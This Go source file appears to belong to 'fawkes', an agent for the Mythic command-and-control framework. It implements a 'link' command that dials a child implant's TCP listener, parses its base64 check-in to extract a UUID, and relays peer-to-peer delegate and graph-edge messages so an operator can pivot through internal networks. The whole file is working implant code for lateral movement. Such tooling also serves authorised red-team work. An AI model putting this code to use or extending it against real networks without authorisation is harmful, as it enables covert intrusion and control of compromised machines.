package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"time"

	"fawkes/pkg/structs"
	"fawkes/pkg/tcp"
)

// tcpProfileInstance is set by main.go when the agent has TCP P2P capability.
// It provides access to child connection management for the link/unlink commands.
var tcpProfileInstance *tcp.TCPProfile

// SetTCPProfile sets the TCP profile instance for link/unlink commands.
func SetTCPProfile(profile *tcp.TCPProfile) {
	tcpProfileInstance = profile
}

// GetTCPProfile returns the TCP profile instance.
func GetTCPProfile() *tcp.TCPProfile {
	return tcpProfileInstance
}

type LinkCommand struct{}

func (c *LinkCommand) Name() string {
	return "link"
}

func (c *LinkCommand) Description() string {
	return "Link to a TCP P2P agent to establish a peer-to-peer connection for internal pivoting"
}

type linkArgs struct {
	Host string `json:"host"`
	Port int    `json:"port"`
}

func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
	var args linkArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Host == "" || args.Port == 0 {
		return structs.CommandResult{
			Output:    "Both host and port are required (e.g., {\"host\": \"10.0.0.2\", \"port\": 7777})",
			Status:    "error",
			Completed: true,
		}
	}

	if tcpProfileInstance == nil {
		return structs.CommandResult{
			Output:    "TCP P2P not available — agent was not built with TCP profile support",
			Status:    "error",
			Completed: true,
		}
	}

	// Connect to the child agent's TCP listener
	addr := fmt.Sprintf("%s:%d", args.Host, args.Port)
	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to connect to %s: %v", addr, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Read the child's initial checkin message (length-prefixed)
	data, err := recvTCPFramed(conn)
	if err != nil {
		conn.Close()
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to read child checkin from %s: %v", addr, err),
			Status:    "error",
			Completed: true,
		}
	}

	// The child sends base64(UUID + encrypted_body).
	// Decode to extract the child's UUID (first 36 bytes of decoded data).
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil || len(decoded) < 36 {
		conn.Close()
		return structs.CommandResult{
			Output:    fmt.Sprintf("Invalid checkin data from %s", addr),
			Status:    "error",
			Completed: true,
		}
	}
	childUUID := string(decoded[:36])

	// Register the child connection and start reading from it
	tcpProfileInstance.AddChildConnection(childUUID, conn)
	tcpProfileInstance.StartReadFromChild(childUUID, conn)

	// Forward the child's checkin as a delegate message to Mythic
	tcpProfileInstance.InboundDelegates <- structs.DelegateMessage{
		Message:       string(data), // Already base64 encoded
		UUID:          childUUID,
		C2ProfileName: "tcp",
	}

	// Send edge notification (P2P graph link)
	tcpProfileInstance.EdgeMessages <- structs.P2PConnectionMessage{
		Source:        tcpProfileInstance.CallbackUUID,
		Destination:   childUUID,
		Action:        "add",
		C2ProfileName: "tcp",
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully linked to %s (child UUID: %s)", addr, childUUID[:8]),
		Status:    "success",
		Completed: true,
	}
}

// recvTCPFramed reads a length-prefixed TCP message (4-byte big-endian length + payload).
func recvTCPFramed(conn net.Conn) ([]byte, error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}

	length := uint32(header[0])<<24 | uint32(header[1])<<16 | uint32(header[2])<<8 | uint32(header[3])
	if length > 10*1024*1024 {
		return nil, fmt.Errorf("message too large: %d bytes", length)
	}

	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, err
	}
	return data, nil
}
